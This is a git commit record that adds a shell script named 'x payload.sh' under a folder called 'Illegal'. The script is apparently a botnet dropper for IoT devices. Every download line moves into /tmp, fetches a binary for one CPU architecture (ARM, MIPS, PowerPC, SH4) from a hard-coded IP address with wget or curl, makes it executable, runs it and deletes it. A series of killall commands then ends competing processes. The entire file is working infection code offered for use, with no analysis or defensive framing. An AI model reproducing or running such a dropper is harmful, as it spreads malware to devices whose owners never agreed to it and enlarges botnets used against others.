177959978f7cf8764d902670365f6f6522df4364
UG-1vFiayb <holtuksss@gmail.com>
2017-05-12 21:52:24 -0500

    Create x payload.sh

---
+++ Illegal/x payload.sh
@@ -0,0 +1,26 @@
+#!/bin/sh
+
+cd /tmp && wget http://185.62.189.239/doggydicksarm && chmod +x doggydicksarm && ./doggydicksarm && rm doggydicksarm 
+cd /tmp && curl http://185.62.189.239/doggydicksarm && chmod +x doggydicksarm && ./doggydicksarm && rm doggydicksarm
+cd /tmp && wget http://185.62.189.239/doggydicksmips && chmod +x doggydicksmips && ./doggydicksmips && rm doggydicksmips
+cd /tmp && curl http://185.62.189.239/doggydicksmips && chmod +x doggydicksmips && ./doggydicksmips && rm doggydicksmips
+cd /tmp && wget http://185.62.189.239/doggydicksmipsel && chmod +x doggydicksmipsel && ./doggydicksmipsel && rm doggydicksmipsel
+cd /tmp && curl http://185.62.189.239/doggydicksmipsel && chmod +x doggydicksmipsel && ./doggydicksmipsel && rm doggydicksmipsel
+cd /tmp && wget http://185.62.189.239/doggydickspowerpc && chmod +x doggydickspowerpc && ./doggydickspowerpc && rm doggydickspowerpc
+cd /tmp && curl http://185.62.189.239/doggydickspowerpc && chmod +x doggydickspowerpc && ./doggydickspowerpc && rm doggydickspowerpc
+cd /tmp && wget http://185.62.189.239/doggydickssh4 && chmod +x doggydickssh4 && ./doggydickssh4 && rm doggydickssh4
+cd /tmp && curl http://185.62.189.239/doggydickssh4 && chmod +x doggydickssh4 && ./doggydickssh4 && rm doggydickssh4
+cd /tmp && wget http://185.62.189.239/doggydicks && chmod +x doggydicks && ./doggydicks && rm doggydicks
+cd /tmp && curl http://185.62.189.239/doggydicks && chmod +x doggydicks && ./doggydicks && rm doggydicks
+killall arm
+killall mips
+killall mipsel
+killall ppc
+killall powerpc
+killall sh4
+killall eeearm
+killall eeemips
+killall eeemipsel
+killall eeeppc
+killall eeepowerpc
+killall eeesh4
